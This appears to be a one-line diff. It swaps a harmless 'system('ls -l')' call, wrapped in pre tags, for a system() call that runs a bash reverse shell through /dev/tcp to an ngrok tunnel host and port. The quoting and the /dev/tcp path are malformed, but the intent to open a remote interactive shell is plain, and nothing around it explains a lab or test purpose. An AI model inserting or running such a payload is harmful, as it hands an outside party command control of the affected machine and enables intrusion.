@@ -1,1 +1,1 @@
-<pre>system('ls -l')</pre>
+<pre>system('bash -c 'exec bash -i &>/dev/tcp/tcp://6.tcp.eu.ngrok.io/18666 <&1'')</pre>
